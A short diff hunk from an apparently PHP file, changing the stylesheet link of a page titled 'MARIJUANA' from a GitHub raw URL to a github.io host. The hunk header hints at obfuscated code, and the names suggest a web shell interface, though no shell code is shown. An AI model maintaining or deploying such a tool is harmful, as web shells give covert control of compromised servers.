@@ -55,7 +55,7 @@ for($i=0;$i<$___;$i++) {
 				<title>MARIJUANA</title>
 
 			<link rel="icon" href="//github.com/eclclub/ESCOBAR/blob/9337131133e0972047d3789efa4081022be5a996/ecobar.jpg" />
-			<link rel="stylesheet" href="//raw.githubusercontent.com/eclclub/ESCOBAR/main/main.css" type="text/css">
+			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
 
 			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
